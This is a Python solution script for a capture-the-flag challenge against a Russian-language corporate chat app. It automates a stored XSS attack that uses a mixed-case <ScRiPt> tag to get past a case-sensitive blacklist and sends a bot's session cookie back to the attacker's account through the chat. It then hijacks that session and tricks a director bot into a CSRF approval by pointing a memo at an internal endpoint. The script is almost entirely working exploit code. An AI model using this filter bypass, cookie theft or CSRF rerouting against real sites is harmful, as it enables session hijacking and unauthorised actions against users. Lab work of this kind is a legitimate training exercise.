#!/usr/bin/env python3
"""
Solution script for the 'annoying' CTF challenge.
Phase 1: Cookie stealing via Stored XSS against 'Начальник' bot (in-band via chat).
Phase 2: CSRF attack against 'Генеральный директор' bot by rerouting request to service internal endpoint (/memos/approve).
No external attacker machine or listener required!
"""
import re
import sys
import time
import requests

TARGET_URL = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else "http://localhost:5000"

def main():
    print(f"[*] Target URL: {TARGET_URL}")
    session = requests.Session()

    # ==========================================
    # PHASE 1: STORED XSS & IN-BAND COOKIE STEALING
    # ==========================================
    print("\n--- PHASE 1: In-Band Stored XSS against Начальник ---")
    username = f"attacker_{int(time.time())}"
    password = "password123"
    print(f"[*] Registering employee account: {username}")
    reg_resp = session.post(f"{TARGET_URL}/register", data={
        "username": username,
        "password": password,
        "display_name": "Младший Специалист",
        "department": "Отдел снабжения"
    })

    if "Служебные диалоги" not in reg_resp.text and "СЛУЖЕБНЫЕ" not in reg_resp.text.upper():
        print("[-] Registration failed!")
        return

    print("[+] Registered and logged in successfully.")

    # In-band XSS payload: sends Начальник's cookie back to our employee account via /send.
    # NOTE: the server now strips a hardcoded blacklist of lowercase XSS tags
    # (script, img, svg, iframe, ...). The filter is case-sensitive, so we use
    # mixed-case <ScRiPt> to bypass it (HTML tag names themselves are
    # case-insensitive).
    xss_payload = f"""<ScRiPt>
fetch('/send', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
    body: 'receiver_username=' + encodeURIComponent('{username}') + '&content=' + encodeURIComponent(document.cookie)
}});
</ScRiPt>"""

    print("[*] Sending in-band XSS payload to 'Начальник'...")
    session.post(f"{TARGET_URL}/send", data={
        "receiver_username": "Начальник",
        "content": xss_payload
    })
    print("[+] Payload posted. Waiting up to 35 seconds for Начальник's visit...")

    # Wait for the bot to visit and send back the cookie in chat
    stolen_cookie = None
    start_time = time.time()
    while time.time() - start_time < 35:
        time.sleep(2)
        print(".", end="", flush=True)
        try:
            r = session.get(f"{TARGET_URL}/api/messages/Начальник")
            if r.status_code == 200:
                msgs = r.json().get('messages', [])
                for m in msgs:
                    # Message sent from Начальник to us containing session cookie
                    if not m.get('is_mine') and 'session=' in m.get('content', ''):
                        match = re.search(r'session=([a-zA-Z0-9_\-\.]+)', m['content'])
                        if match:
                            stolen_cookie = match.group(1)
                            break
            if stolen_cookie:
                break
        except Exception:
            pass
    print()

    if not stolen_cookie:
        print("[-] No cookie captured within timeout. Ensure bot is running.")
        return

    print(f"[+] Captured Начальник's session cookie: {stolen_cookie}")

    # ==========================================
    # PHASE 2: REROUTING CSRF TO SERVICE ENDPOINT
    # ==========================================
    print("\n--- PHASE 2: CSRF Attack by Rerouting to Service Address ---")
    boss_session = requests.Session()
    boss_session.cookies.set('session', stolen_cookie)

    # Verify Boss session
    chat_resp = boss_session.get(f"{TARGET_URL}/chat/директор")
    if "OmFEST{" in chat_resp.text:
        print("[!] Flag already present in chat:")
        flag_match = re.search(r'(OmFEST\{[^}]+\})', chat_resp.text)
        if flag_match:
            print(f"[SUCCESS] FLAG: {flag_match.group(1)}")
            return

    print("[+] Verified: Authenticated as Начальник.")
    print("[+] Director points to «Служебные записки» (/memos).")

    # Memos inspection
    memos_resp = boss_session.get(f"{TARGET_URL}/memos")
    if memos_resp.status_code != 200:
        print(f"[-] Could not access /memos: HTTP {memos_resp.status_code}")
        return

    print("[+] Accessed «Служебные записки и согласования» (/memos).")
    print("[+] Target CSRF address on this service: http://web:5000/memos/approve (or /memos/approve).")

    # Submit memo rerouting Director to /memos/approve on this service
    csrf_reroute_url = "http://web:5000/memos/approve"
    print(f"[*] Submitting memo with rerouted internal URL: {csrf_reroute_url}")
    sub_resp = boss_session.post(f"{TARGET_URL}/memos", data={
        "title": "Запрос на предоставление допуска к закрытому реестру",
        "url": csrf_reroute_url,
        "comment": "Служебная записка для согласования допуска."
    })

    print("[+] Memo submitted. Waiting for General Director to review and trigger approval...")

    # Wait for Director to review and trigger CSRF approval
    found_flag = None
    wait_start = time.time()
    while time.time() - wait_start < 40:
        time.sleep(2)
        print(".", end="", flush=True)
        try:
            check_api = boss_session.get(f"{TARGET_URL}/api/messages/директор")
            if check_api.status_code == 200:
                msgs = check_api.json().get('messages', [])
                for m in msgs:
                    flag_match = re.search(r'(OmFEST\{[^}]+\})', m.get('content', ''))
                    if flag_match:
                        found_flag = flag_match.group(1)
                        break
            if not found_flag:
                check_chat = boss_session.get(f"{TARGET_URL}/chat/директор")
                flag_match = re.search(r'(OmFEST\{[^}]+\})', check_chat.text)
                if flag_match:
                    found_flag = flag_match.group(1)
            if found_flag:
                break
        except Exception:
            pass

    print()
    if found_flag:
        print(f"\n=======================================================")
        print(f"[SUCCESS] FLAG CAPTURED: {found_flag}")
        print(f"=======================================================\n")
    else:
        # Fallback check on /memos
        check_memos = boss_session.get(f"{TARGET_URL}/memos")
        flag_match = re.search(r'(OmFEST\{[^}]+\})', check_memos.text)
        if flag_match:
            print(f"\n[SUCCESS] FLAG CAPTURED: {flag_match.group(1)}\n")
        else:
            print("[-] Exploit failed to extract flag within timeout.")

if __name__ == '__main__':
    main()
